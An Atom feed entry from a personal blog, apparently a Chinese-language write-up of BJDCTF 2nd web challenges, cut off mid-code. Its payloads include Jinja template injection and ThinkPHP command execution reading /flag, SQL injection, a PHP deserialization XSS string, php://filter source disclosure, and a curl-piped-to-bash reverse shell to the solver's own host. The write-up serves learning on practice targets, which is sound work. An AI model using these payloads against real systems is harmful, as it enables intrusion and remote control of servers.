<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ENSUPERB&#39;S BLOG</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://ensuperb.github.io/"/>
  <updated>2021-04-21T13:09:53.928Z</updated>
  <id>https://ensuperb.github.io/</id>
  
  <author>
    <name>ENSUPERB</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BJDCTF 2nd Web</title>
    <link href="https://ensuperb.github.io/posts/bjdctf-2nd-web/"/>
    <id>https://ensuperb.github.io/posts/bjdctf-2nd-web/</id>
    <published>2021-04-20T12:35:49.000Z</published>
    <updated>2021-04-21T13:09:53.928Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF-2nd"><a href="#BJDCTF-2nd" class="headerlink" title="BJDCTF 2nd"></a>BJDCTF 2nd</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Fake-google"><a href="#Fake-google" class="headerlink" title="Fake google"></a>Fake google</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/qaq?name=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'cat /flag'</span>).<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c7c26058-4d64-<span class="number">4b02</span>-be14-c7aaad68e492.node3.buuoj.cn/?s=<span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=cat /flag</span><br></pre></td></tr></table></figure><h3 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h3><p>强行让我学到了很多关于http的header。也理解为什么这个标题叫这个了，好活。</p><p>开始时以为是sql注入得到admin，实际上是登陆其他用户即可，抓包响应页面的最底下有个注释。(加粗部分为本题需使用的头)</p><table><thead><tr><th>Header</th><th>解释</th><th>示例</th></tr></thead><tbody><tr><td>Accept</td><td>指定客户端能够接收的内容类型</td><td>Accept: text/plain, text/html,application/json</td></tr><tr><td>Accept-Charset</td><td>浏览器可以接受的字符编码集。</td><td>Accept-Charset: iso-8859-5</td></tr><tr><td>Accept-Encoding</td><td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td><td>Accept-Encoding: compress, gzip</td></tr><tr><td>Accept-Language</td><td>浏览器可接受的语言</td><td>Accept-Language: en,zh</td></tr><tr><td>Accept-Ranges</td><td>可以请求网页实体的一个或者多个子范围字段</td><td>Accept-Ranges: bytes</td></tr><tr><td>Authorization</td><td>HTTP授权的授权证书</td><td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Cache-Control</td><td>指定请求和响应遵循的缓存机制</td><td>Cache-Control: no-cache</td></tr><tr><td>Connection</td><td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td><td>Connection: close</td></tr><tr><td><strong>Cookie</strong></td><td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td><td>Cookie: $Version=1; Skin=new;</td></tr><tr><td>Content-Length</td><td>请求的内容长度</td><td>Content-Length: 348</td></tr><tr><td>Content-Type</td><td>请求的与实体对应的MIME信息</td><td>Content-Type: application/x-www-form-urlencoded</td></tr><tr><td><strong>Client-ip</strong></td><td>A common requirement is to access the real client address from the server.</td><td>Client-ip: 127.0.0.1</td></tr><tr><td>Date</td><td>请求发送的日期和时间</td><td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td></tr><tr><td>Expect</td><td>请求的特定的服务器行为</td><td>Expect: 100-continue</td></tr><tr><td><strong>From</strong></td><td>发出请求的用户的Email</td><td>From: <a href="mailto:user@email.com">user@email.com</a></td></tr><tr><td>Host</td><td>指定请求的服务器的域名和端口号</td><td>Host: <a href="http://www.zcmhi.com" target="_blank" rel="noopener">www.zcmhi.com</a></td></tr><tr><td>If-Match</td><td>只有请求内容与实体相匹配才有效</td><td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Modified-Since</td><td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td><td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>If-None-Match</td><td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td><td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Range</td><td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td><td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Unmodified-Since</td><td>只在实体在指定时间之后未被修改才请求成功</td><td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>Max-Forwards</td><td>限制信息通过代理和网关传送的时间</td><td>Max-Forwards: 10</td></tr><tr><td>Pragma</td><td>用来包含实现特定的指令</td><td>Pragma: no-cache</td></tr><tr><td>Proxy-Authorization</td><td>连接到代理的授权证书</td><td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Range</td><td>只请求实体的一部分，指定范围</td><td>Range: bytes=500-999</td></tr><tr><td><strong>Referer</strong></td><td>先前网页的地址，当前请求网页紧随其后,即来路</td><td>Referer: <a href="http://www.zcmhi.com/archives/71.html" target="_blank" rel="noopener">http://www.zcmhi.com/archives…</a></td></tr><tr><td>TE</td><td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td><td>TE: trailers,deflate;q=0.5</td></tr><tr><td><strong>Upgrade</strong></td><td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td><td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td></tr><tr><td><strong>User-Agent</strong></td><td>User-Agent的内容包含发出请求的用户信息</td><td>User-Agent: Mozilla/5.0 (Linux; X11)</td></tr><tr><td><strong>Via</strong></td><td>通知中间网关或代理服务器地址，通信协议</td><td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td></tr><tr><td>Warning</td><td>关于消息实体的警告信息</td><td>Warn: 199 Miscellaneous warning</td></tr></tbody></table><h3 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h3><p>扫描一遍网站，发现hint.txt。</p><p>发现过滤字符时，网站会alert一个stophacking。例如等号。</p><p>没有等号，可以试试网上的二分法求解。</p><p><code>password=or/**/length(database())&gt;0#&amp;username=admin\</code></p><p>判断成功，页面上出现xxx需要变得stronger。</p><p>判断无效，页面仍然是girlfriend。</p><h3 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h3><blockquote><p>知识点： git泄露、反序列化漏洞、XSS</p></blockquote><p>反序列化漏洞需要借助代码中的对象，由于泄露的代码中并没有对象，故而我们使用PHP内置的对象，类似于PWN的ROP。</p><p>7.0以上的版本可以用<code>Error</code>类，5.0或者7.0以上的可以用<code>Exception</code>类，因此<code>Exception</code>类更为适用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;window.location.href='https://github.com'&lt;/script&gt;"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br><span class="line"></span><br><span class="line">?yds_is_so_beautiful=O%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">Exception</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A58%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.location.href%<span class="number">3</span>D%<span class="number">27</span>https%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fgithub.com%<span class="number">27</span>%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="keyword">Exception</span>%<span class="number">00</span>string%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fusercode%<span class="number">2</span>Ffile.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="keyword">Exception</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="keyword">Exception</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>本题在触发XSS后会在本在内的cookies显示flag。</p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">【拓展】反序列化之PHP原生类的利用</a></p><h3 id="ElementMaster"><a href="#ElementMaster" class="headerlink" title="ElementMaster"></a>ElementMaster</h3><blockquote><p>知识点： 元素周期表、火眼金睛</p></blockquote><p>开始研究图片研究半天，看了下源码，源码有两个可疑id，直接给他上十六进制转字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">506F2E  Po.</span><br><span class="line">706870  php</span><br></pre></td></tr></table></figure><p>怀疑是不是自己整错了，<code>Po.</code> 能有什么坏心思呢？看了下别人的wp发现是没错的，而且这是元素周期表中的钋元素，好家伙，很结合主题。题目的意思是遍历一遍元素周期表。那我也顺便学学别人是怎么写的吧。虽然不知道原作者是谁，但是由衷感谢。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://c411b4fc-2454-4132-99db-dea01c5835c9.node3.buuoj.cn/'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">element=[<span class="string">'H'</span>, <span class="string">'He'</span>, <span class="string">'Li'</span>, <span class="string">'Be'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'F'</span>, <span class="string">'Ne'</span>, <span class="string">'Na'</span>, <span class="string">'Mg'</span>, <span class="string">'Al'</span>, <span class="string">'Si'</span>, <span class="string">'P'</span>, <span class="string">'S'</span>, <span class="string">'Cl'</span>, <span class="string">'Ar'</span>,</span><br><span class="line">        <span class="string">'K'</span>, <span class="string">'Ca'</span>, <span class="string">'Sc'</span>, <span class="string">'Ti'</span>, <span class="string">'V'</span>, <span class="string">'Cr'</span>, <span class="string">'Mn'</span>, <span class="string">'Fe'</span>, <span class="string">'Co'</span>, <span class="string">'Ni'</span>, <span class="string">'Cu'</span>, <span class="string">'Zn'</span>, <span class="string">'Ga'</span>, <span class="string">'Ge'</span>, <span class="string">'As'</span>, <span class="string">'Se'</span>, <span class="string">'Br'</span>,</span><br><span class="line">        <span class="string">'Kr'</span>, <span class="string">'Rb'</span>, <span class="string">'Sr'</span>, <span class="string">'Y'</span>, <span class="string">'Zr'</span>, <span class="string">'Nb'</span>, <span class="string">'Mo'</span>, <span class="string">'Te'</span>, <span class="string">'Ru'</span>, <span class="string">'Rh'</span>, <span class="string">'Pd'</span>, <span class="string">'Ag'</span>, <span class="string">'Cd'</span>, <span class="string">'In'</span>, <span class="string">'Sn'</span>, <span class="string">'Sb'</span>, <span class="string">'Te'</span>,</span><br><span class="line">        <span class="string">'I'</span>, <span class="string">'Xe'</span>, <span class="string">'Cs'</span>, <span class="string">'Ba'</span>, <span class="string">'La'</span>, <span class="string">'Ce'</span>, <span class="string">'Pr'</span>, <span class="string">'Nd'</span>, <span class="string">'Pm'</span>, <span class="string">'Sm'</span>, <span class="string">'Eu'</span>, <span class="string">'Gd'</span>, <span class="string">'Tb'</span>, <span class="string">'Dy'</span>, <span class="string">'Ho'</span>, <span class="string">'Er'</span>, <span class="string">'Tm'</span>,</span><br><span class="line">        <span class="string">'Yb'</span>, <span class="string">'Lu'</span>, <span class="string">'Hf'</span>, <span class="string">'Ta'</span>, <span class="string">'W'</span>, <span class="string">'Re'</span>, <span class="string">'Os'</span>, <span class="string">'Ir'</span>, <span class="string">'Pt'</span>, <span class="string">'Au'</span>, <span class="string">'Hg'</span>, <span class="string">'Tl'</span>, <span class="string">'Pb'</span>, <span class="string">'Bi'</span>, <span class="string">'Po'</span>, <span class="string">'At'</span>, <span class="string">'Rn'</span>,</span><br><span class="line">        <span class="string">'Fr'</span>, <span class="string">'Ra'</span>, <span class="string">'Ac'</span>, <span class="string">'Th'</span>, <span class="string">'Pa'</span>, <span class="string">'U'</span>, <span class="string">'Np'</span>, <span class="string">'Pu'</span>, <span class="string">'Am'</span>, <span class="string">'Cm'</span>, <span class="string">'Bk'</span>, <span class="string">'Cf'</span>, <span class="string">'Es'</span>, <span class="string">'Fm'</span>,<span class="string">'Md'</span>, <span class="string">'No'</span>, <span class="string">'Lr'</span>,</span><br><span class="line">        <span class="string">'Rf'</span>, <span class="string">'Db'</span>, <span class="string">'Sg'</span>, <span class="string">'Bh'</span>, <span class="string">'Hs'</span>, <span class="string">'Mt'</span>, <span class="string">'Ds'</span>, <span class="string">'Rg'</span>, <span class="string">'Cn'</span>, <span class="string">'Nh'</span>, <span class="string">'Fl'</span>, <span class="string">'Mc'</span>, <span class="string">'Lv'</span>, <span class="string">'Ts'</span>, <span class="string">'Og'</span>, <span class="string">'Uue'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> element:</span><br><span class="line">        r=requests.get(url+i+<span class="string">'.php'</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                page+=r.text</span><br><span class="line">                <span class="keyword">print</span> (page)</span><br></pre></td></tr></table></figure><p>然后爆出一个路径，直接访问得到flag。</p><h3 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h3><p>开始时审查了元素，发现了<code>test.php</code>页面，按照里面的提示（I left some good for you in my admin passwd.）我不进行SQL注入，而是尝试一波常用密码找回（狗头）。</p><p>cookie中的<code>dXNlcg</code>变量解码后怀疑是时间戳。</p><p>cookie中的<code>dXNlcg</code>变量与<code>Forecast success rate</code>正比关系。</p><p>Burst successed! The passwd is av11664517@1583985203.</p><p>密码放上去一直是错，不过看到这个av开头的数值我第一想到时B站的视频，看评论找了很久。</p><p><img src="https://z3.ax1x.com/2021/04/21/cbMNq0.png" alt="image-20210419191518562"></p><h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><blockquote><p>知识点： 代码泄露、反弹shell</p></blockquote><p>题目提示swp泄露了，给他点面子，进入<code>.index.php.swp</code>页面。下载后<code>vim -r index.php</code>打开。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'girl_friend'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'just girl'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了挺多东西的，而且没回显，我只能想到用<code>curl</code>来反弹shell。</p><p>在自己的公网机子里放入bash.txt，内容如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/you_ip/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然后在自己机子里侦听<code>9999</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9999</span><br></pre></td></tr></table></figure><p>在payload填充</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend=curl+<span class="string">http:</span><span class="comment">//your_IP/bash.txt+|+bash</span></span><br></pre></td></tr></table></figure><p>最后用<code>find</code>来寻找真flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$find</span> / -name flag </span><br><span class="line">/etc/demo/P3rh4ps/love/you/flag</span><br></pre></td></tr></table></figure><p>拓展：</p><p><a href="https://ntwyc2018.github.io/2018/07/06/yuanma/" target="_blank" rel="noopener">文件源码泄漏大全</a></p><p><a href="https://www.secpulse.com/archives/124398.html" target="_blank" rel="noopener">常见的Web源码泄漏漏洞及其利用</a></p><h3 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测*"></a>文件探测*</h3><blockquote><p>知识点：robots、请求头、php伪协议、代码审计、格式化输出注入、session与cookie的关系、真伪随机数</p></blockquote><p>考点很多，这道题还是有点<strong>值得推荐</strong>的。</p><p>robots.txt</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agen<span class="variable">t:</span> *</span><br><span class="line">Disallo<span class="variable">w:</span> /flag.php</span><br><span class="line">Disallo<span class="variable">w:</span> /admin.php</span><br><span class="line">Allo<span class="variable">w:</span> /<span class="built_in">index</span>.php</span><br></pre></td></tr></table></figure><p>访问<code>admin.php</code>页面说是要本地访问，xff、client-ip什么的都没有用途，可能是用<code>remoteaddr</code>的，所以打算先放一下。</p><p>据说做BJD的题要一直开着F12，发现回显报文中有hint，指向了<code>home.php</code>。进入后指定定向<code>home.php?file=system</code>。</p><p>试了一下<code>file=index</code>，管理员骂骂咧咧地关闭了站点。（不是）发现回显多了个<code>.fxxkyou</code>不得不说出题人很素质，为避免伤了我们的心还打上了码。其他类似的我们尝试了<code>flag</code>会回显<code>not now</code>，<code>admin</code>会回显不是管理等等。</p><p>试过一段时间后想到有可能是文件包含，那可以试试伪协议，于是/home.php?file=php://filter/convert.base64-encode/resource=system，得到system的源码，home的也得到了，其他被home的业务逻辑限制了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// system.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'y1ng'</span>]) || $_COOKIE[<span class="string">'y1ng'</span>] !== sha1(md5(<span class="string">'y1ng'</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;"</span>;</span><br><span class="line">    header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ '</span>;</span><br><span class="line">$str3 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ '</span>;</span><br><span class="line">$str4 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ '</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">    &lt;title&gt;File Detector&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"css/normalize.css"</span> /&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"css/demo.css"</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"css/component.css"</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src=<span class="string">"js/modernizr.custom.js"</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section&gt;</span><br><span class="line">    &lt;form id="theForm" class="simform" autocomplete="off" action="system.php" method="post"&gt;</span><br><span class="line">        &lt;div class="simform-inner"&gt;</span><br><span class="line">            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;</span><br><span class="line">            &lt;ol class="questions"&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label <span class="keyword">for</span>=<span class="string">"q1"</span>&gt;你知道目录下都有什么文件吗?&lt;/label&gt;&lt;/span&gt;</span><br><span class="line">                    &lt;input id=<span class="string">"q1"</span> name=<span class="string">"q1"</span> type=<span class="string">"text"</span>/&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label <span class="keyword">for</span>=<span class="string">"q2"</span>&gt;请输入你想检测文件内容长度的url&lt;/label&gt;&lt;/span&gt;</span><br><span class="line">                    &lt;input id=<span class="string">"q2"</span> name=<span class="string">"q2"</span> type=<span class="string">"text"</span>/&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label <span class="keyword">for</span>=<span 